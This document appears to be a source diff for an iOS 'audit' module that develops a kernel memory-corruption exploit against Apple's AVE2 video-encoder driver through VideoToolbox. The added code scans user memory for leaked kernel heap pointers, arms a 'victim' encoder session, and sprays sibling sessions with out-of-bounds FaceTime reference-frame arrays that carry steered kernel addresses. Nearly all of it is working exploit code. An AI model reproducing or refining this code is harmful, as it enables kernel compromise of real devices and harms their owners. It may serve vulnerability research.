@@ -1,6 +1,7 @@
 #import "KPAuditAVESpriteModule.h"
 #import <UIKit/UIKit.h>
 #import "KPLog.h"
+#import "KPVMScanPolicy.h"
 #import <VideoToolbox/VideoToolbox.h>
 #import <CoreVideo/CoreVideo.h>
 #import <mach/mach.h>
@@ -140,23 +141,89 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     const int32_t W = 1280, H = 720;
     const int32_t sw = 64, sh = 64;
 
+    // 0) Pre-scan userspace RW memory for live ZONE_HEAP kernel pointers (e.g. 0xffffffee4e806580,
+    //    0xfffffe2673806580) so we can steer NTL directly into the live kernel heap band!
+    uint64_t liveKPtrs[8] = {0};
+    int liveKPtrCount = 0;
+    {
+        vm_address_t addr = 0;
+        vm_size_t size = 0;
+        uint32_t depth = 0;
+        vm_region_submap_info_data_64_t info;
+        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
+        uint64_t pageBuf[512];
+        vm_address_t exclAddrs[2] = { (vm_address_t)pageBuf, (vm_address_t)liveKPtrs };
+        vm_size_t exclSizes[2] = { sizeof(pageBuf), sizeof(liveKPtrs) };
+        for (int iter = 0; iter < 2048 && liveKPtrCount < 8; iter++) {
+            count = VM_REGION_SUBMAP_INFO_COUNT_64;
+            if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
+                                     (vm_region_recurse_info_t)&info, &count) != KERN_SUCCESS || size == 0) {
+                break;
+            }
+            if (info.is_submap) { depth++; continue; }
+            if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
+                size <= 16 * 1024 * 1024 &&
+                !KPVMShouldSkipRegion(&info, addr, size, &depth, exclAddrs, exclSizes, 2)) {
+                for (vm_size_t off = 0; off + sizeof(pageBuf) <= size && liveKPtrCount < 8; off += sizeof(pageBuf)) {
+                    vm_size_t outSz = 0;
+                    if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
+                                          (vm_address_t)pageBuf, &outSz) != KERN_SUCCESS ||
+                        outSz < sizeof(uint64_t)) {
+                        break;
+                    }
+                    size_t words = outSz / sizeof(uint64_t);
+                    for (size_t w = 0; w < words && liveKPtrCount < 8; w++) {
+                        uint64_t v = pageBuf[w];
+                        if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
+                            BOOL dup = NO;
+                            for (int k = 0; k < liveKPtrCount; k++) {
+                                if ((liveKPtrs[k] >> 32) == (v >> 32)) { dup = YES; break; }
+                            }
+                            if (!dup) liveKPtrs[liveKPtrCount++] = v;
+                        }
+                    }
+                }
+            }
+            if (addr + size <= addr) break;
+            addr += size;
+        }
+    }
+
     int ntl = self.ntl;
+    if (ntl <= 0 && liveKPtrCount > 0) {
+        int32_t hiSigned = (int32_t)(uint32_t)(liveKPtrs[0] >> 32);
+        ntl = 16463 + hiSigned;
+    } else if (ntl <= 0) {
+        ntl = 16445; // 0xffffffee00000059
+    }
     uint64_t steeredX0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
 
-    // Include both the T8122/T8130 pInfo/kheap band confirmed in panic-full
+    // Include live discovered ZONE_HEAP bands first, then T8122/T8130 pInfo/kheap bands
     // (0xffffffed..0xffffffef -> NTL 16444..16446) and 0xfffffe10..0xfffffe38.
-    uint64_t x0cands[10];
+    uint64_t x0cands[14];
     int ncand = 0;
     x0cands[ncand++] = steeredX0;
+    for (int lk = 0; lk < liveKPtrCount && ncand < 14; lk++) {
+        uint64_t liveSteered = (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL;
+        if (liveSteered != steeredX0) x0cands[ncand++] = liveSteered;
+    }
     const uint32_t hiBands[] = {
-        0xFFFFFFEDu, 0xFFFFFFEEu, 0xFFFFFFEFu,
-        0xFFFFFE10u, 0xFFFFFE18u, 0xFFFFFE20u, 0xFFFFFE28u, 0xFFFFFE30u, 0xFFFFFE38u
+        0xFFFFFFEEu, 0xFFFFFFEDu, 0xFFFFFFEFu,
+        0xFFFFFE26u, 0xFFFFFE10u, 0xFFFFFE18u, 0xFFFFFE20u, 0xFFFFFE28u, 0xFFFFFE30u, 0xFFFFFE38u
     };
-    for (size_t bi = 0; bi < sizeof(hiBands) / sizeof(hiBands[0]) && ncand < 10; bi++) {
+    for (size_t bi = 0; bi < sizeof(hiBands) / sizeof(hiBands[0]) && ncand < 14; bi++) {
         uint64_t cand = ((uint64_t)hiBands[bi] << 32) | 0x59ULL;
-        if (cand != steeredX0) {
-            x0cands[ncand++] = cand;
+        BOOL exists = NO;
+        for (int c = 0; c < ncand; c++) {
+            if (x0cands[c] == cand) { exists = YES; break; }
         }
+        if (!exists) x0cands[ncand++] = cand;
+    }
+    [report appendFormat:@"live ZONE_HEAP bands found: %d\n", liveKPtrCount];
+    for (int lk = 0; lk < liveKPtrCount; lk++) {
+        int lntl = 16463 + (int32_t)(uint32_t)(liveKPtrs[lk] >> 32);
+        [report appendFormat:@"  live[%d] = 0x%016llx -> steeredNTL=%d (x0=0x%016llx)\n",
+         lk, liveKPtrs[lk], lntl, (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL];
     }
     [report appendFormat:@"target NTL=%d steered_x0=0x%016llx\n", ntl, steeredX0];
     [report appendString:@"x0 candidates in spray:\n"];
@@ -165,8 +232,8 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
 
     // 1) VICTIM session created AND armed BEFORE spray so its AppleAVE2UserClient
-    //    context is allocated ahead of the sibling/OOL/pipe spray, WITHOUT
-    //    ExpectedFrameRate=60 / BaseLayerFrameRate=15 (which clamps NTL to 3).
+    //    context is allocated ahead of the sibling/OOL/pipe spray, with PropertyMode=1
+    //    + RealTime=NO + NumOfTemporalLayer + PrepareToEncodeFrames committing POST=ntl.
     VTCompressionSessionRef victim = NULL;
     NSMutableArray *vSink = [NSMutableArray array];
     CFTypeRef retainedVSink = CFRetain((__bridge CFTypeRef)vSink);
@@ -179,35 +246,76 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
         return report;
     }
+    OSStatus pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
     OSStatus uSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+    VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+    OSStatus privNSt = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(ntl));
     OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
-    int vrb = -1;
+    int vrbPre = -1, vrbPost = -1;
     CFNumberRef vbn = NULL;
     if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
-        CFNumberGetValue(vbn, kCFNumberIntType, &vrb);
+        CFNumberGetValue(vbn, kCFNumberIntType, &vrbPre);
         CFRelease(vbn);
     }
-    [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d usage=%d set=%d rb=%d",
-                   (void *)victim, ntl, (int)uSt, (int)nSt, vrb]];
-    [report appendFormat:@"victim session created (%p) before spray: usage=%d NTL_set(%d)=%d readback=%d\n",
-     (void *)victim, (int)uSt, ntl, (int)nSt, vrb];
+    OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
+    vbn = NULL;
+    if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
+        CFNumberGetValue(vbn, kCFNumberIntType, &vrbPost);
+        CFRelease(vbn);
+    }
+    [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d usage=%d privSet=%d set=%d pre=%d prep=%d post=%d",
+                   (void *)victim, ntl, (int)pmSt, (int)uSt, (int)privNSt, (int)nSt, vrbPre, (int)vPrep, vrbPost]];
+    [report appendFormat:@"victim session created (%p) before spray: pm=%d usage=%d privSet=%d NTL_set(%d)=%d PRE=%d prep=%d POST=%d\n",
+     (void *)victim, (int)pmSt, (int)uSt, (int)privNSt, ntl, (int)nSt, vrbPre, (int)vPrep, vrbPost];
 
-    // 2) SPRAY siblings — keep valid NTL=3 on siblings so their PrepareToEncodeFrames
-    //    actually succeeds and materializes pInfo in AppleAVE2 kernel zone, while placing
-    //    marker/candidate values in bitrate/keyframe fields.
+    // 2) SPRAY siblings — arm with PropertyMode=1, EnableUserRefForFacetime=YES,
+    //    UserDPBFramesForFaceTime (34 int32s including OOB pair #16 carrying x0cands),
+    //    and UserRPSForFaceTime (inner OOB 24 + outer OOB arr5 into pINS+0x1406c..).
     int32_t marker = (int32_t)self.marker;
     NSMutableArray *siblings = [NSMutableArray array];
     for (int i = 0; i < self.sprayCount; i++) {
         VTCompressionSessionRef s = [self makeSessionWidth:sw height:sh];
         if (!s) continue;
+        uint64_t cand64 = x0cands[i % ncand];
+        uint32_t cLo = (uint32_t)(cand64 & 0xffffffffULL);
+        uint32_t cHi = (uint32_t)(cand64 >> 32);
+        VTSessionSetProperty(s, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
+        VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
         VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
         VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@3);
         VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("ExpectedFrameRate"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));
+
+        NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
+        for (int p = 0; p < 17; p++) {
+            [dpb34 addObject:@((int32_t)cLo)];
+            [dpb34 addObject:@((int32_t)cHi)];
+        }
+        VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
+
+        NSMutableArray *s0Oob24 = [NSMutableArray arrayWithCapacity:24];
+        NSMutableArray *s1Oob24 = [NSMutableArray arrayWithCapacity:24];
+        for (int k = 0; k < 24; k++) {
+            int16_t hval = (int16_t)((k & 1) ? (cHi & 0xffff) : (cLo & 0xffff));
+            [s0Oob24 addObject:@(hval)];
+            [s1Oob24 addObject:@(hval)];
+        }
+        NSDictionary *rpsOob = @{
+            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+            @"NumNegativePics": @2,
+            @"NumPositivePics": @2,
+            @"DeltaPOCS0Minus1": s0Oob24,
+            @"UsedByCurrPicS0Flag": @3,
+            @"DeltaPOCS1Minus1": s1Oob24,
+            @"UsedByCurrPicS1Flag": @3,
+        };
+        VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"),
+                             (__bridge CFTypeRef)@[ rpsOob, rpsOob, rpsOob, rpsOob, rpsOob ]);
+
         if ((i & 1) == 0) {
-            int64_t pv = (int64_t)x0cands[(i >> 1) % ncand];
+            int64_t pv = (int64_t)cand64;
             VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(pv));
             VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(pv));
         }
@@ -312,7 +420,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
     [self journal:[NSString stringWithFormat:
                    @"BEFORE_VICTIM_ENCODE ntl=%d set=%d readback=%d x0=0x%016llx",
-                   ntl, (int)nSt, vrb, steeredX0]];
+                   ntl, (int)nSt, vrbPost, steeredX0]];
     if (pb) {
         @synchronized (vSink) { [vSink removeAllObjects]; }
         OSStatus e0 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid,
